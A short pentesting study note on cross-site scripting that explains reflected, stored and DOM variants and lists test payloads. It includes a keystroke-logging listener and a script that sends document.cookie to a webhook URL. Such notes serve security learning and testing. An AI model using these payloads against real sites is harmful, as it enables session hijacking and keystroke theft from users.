#XSS #JavaScript 

Executes JavaScripts in a victims browser ([HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting) has more payloads for each type)

1. **Reflected** - scripts you are trying to inject comes from the current HTTP request. You send a request with the script in it, and you get a response, that script is included in the response. Can only target yourself unless the payload is in the URI and you entice a user to click on the link.
2. **Stored** - Payload is stored in a database to retrieve later. Allows attacks on other users.
3. **DOM-based** - Client side has vulnerable JavaScript that uses untrusted input instead of having a vulnerability server side.

Before you check for XSS vulnerabilities, check for HTML injection first:
- `<h1>Test</h1>`

**Reflected/Stored XSS payloads:**
- `alert(1)` - popular XSS attack, pops a window in browser
	- may need to test with `print` and `prompt` as `alert` may be filtered out
- `print()
- `prompt("hello")`
- `<script>alert(document.cookie)</script>`

We can create a function called `logKey` to create an Event Listener for keystrokes and output them in the console. Real attack would replace console with a fetch API to exfiltrate information:
- `function logKey(event){console.log(event.key)}`
- `document.addEventListener('keydown', logKey)`

**[DOM payloads](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss):**
- `<script>prompt(1)</script>`
- `<img src=x onerror="prompt(1)">`
- `<img src=x onerror="window.location.href='https://google.com'">`

Stored payloads are the same for reflected but when you reload the web page, the payload activates again as it is stored (`<script>prompt(1)</script>)
- You can check the other container (started with Firefox container extension) and reload that page. The same script will be activated as the other container since it is now stored in the web page
- `<script>alert(document.cookie)</script>`

Payload to get cookie and view it in [Webhook](https://webhook.site/#!/view/becd615c-85f0-4ae8-9b5d-13a9dd8a46f6):
- `<script>var i=new Image; i.src="<Webhook URL>/?"+document.cookie;</script>`
- cookie is visible in webhook web page
